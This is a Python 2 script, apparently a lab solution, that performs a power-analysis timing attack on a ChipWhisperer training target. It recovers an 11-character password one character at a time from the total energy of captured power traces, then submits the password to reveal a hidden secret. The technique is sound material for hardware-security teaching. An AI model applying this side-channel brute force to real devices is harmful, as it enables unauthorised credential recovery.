# bruteforce.py
#
# Simple Power Analysis (SPA) / timing brute-force against the ChipWhisperer
# `ecslabs-passwd` target. Each correct password character causes the target's
# comparison loop to run one extra iteration, which the processor spends measurable
# extra time and energy executing. By measuring the TOTAL ENERGY of each captured
# power trace, the correct character at each position is the one that maximises it.
#
# Environment: this runs INSIDE the ChipWhisperer Capture GUI's script runner on the
# legacy ChipWhisperer v4 VM, so it is Python 2 (note the `print` statements) and
# relies on the GUI-injected `self.scope` / `self.target` / `self.aux_list` / `self.ktp`
# objects. It is not a standalone Python 3 script.
#
# Based on the lab-provided capture_countup.py.

import chipwhisperer as cw
import string
import numpy as np
from chipwhisperer.capture.auxiliary.ResetCW1173Read import ResetCW1173

# --- 1. GUI COMPATIBILITY ---------------------------------------------------
# When launched from the Capture GUI these are injected into scope; the try/except
# keeps the script importable outside that context.
try:
    scope = self.scope
    target = self.target
    aux_list = self.aux_list
    ktp = self.ktp
except NameError:
    pass

# --- 2. SCOPE SETUP ---------------------------------------------------------
scope.gain.gain = 45
scope.adc.samples = 2000
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7370000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.io.hs2 = "clkgen"

target.key_cmd = ""
target.output_cmd = ""

# Reset the target before every capture so each trace starts from a clean state.
resetter = ResetCW1173(xmega=True, delay_ms=1200)
aux_list.register(resetter.resetThenDelay, "before_trace")

# --- 3. BRUTE FORCE (TOTAL ENERGY METRIC) -----------------------------------

# The password may contain any character from this set, and is 11 characters long.
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

# Start with 11 'x's to hold the string at a constant length while we search.
password = list("xxxxxxxxxxx")


def capture_for_guess(guess_string):
    """Send one guess to the target and return its captured power trace."""
    target.go_cmd = guess_string
    cw.captureN(self.scope, self.target, None, self.aux_list, self.ktp, 1)
    return scope.getLastTrace()


def trace_metric(trace):
    """Total energy = area under the |power| curve.

    A correct character adds a loop iteration, so the target runs longer and the
    trace carries more total energy. This whole-trace metric is far more robust
    than reading a single sample point, which is vulnerable to hardware jitter.
    """
    return np.sum(np.abs(trace))


print "Starting brute force using Total Energy Metric..."

for position in range(11):          # 11-character password
    best_char = 'a'
    best_metric = 0

    for c in charset:               # try every allowed character at this position
        password[position] = c
        guess = "".join(password) + "\n"

        trace = capture_for_guess(guess)
        metric = trace_metric(trace)

        if metric > best_metric:
            best_metric = metric
            best_char = c

    # Lock in the highest-energy character and move to the next position.
    password[position] = best_char
    print "Found char", position + 1, "so far:", "".join(password[:position + 1])

final_password = "".join(password)
print "\nRecovered password:", final_password

# Send the full recovered password once more to trigger the success state and
# print the hidden secret in the Capture terminal.
target.go_cmd = final_password + "\n"
cw.captureN(self.scope, self.target, None, self.aux_list, self.ktp, 1)
print "Check the CWCapture terminal window to see the hardware secret!"
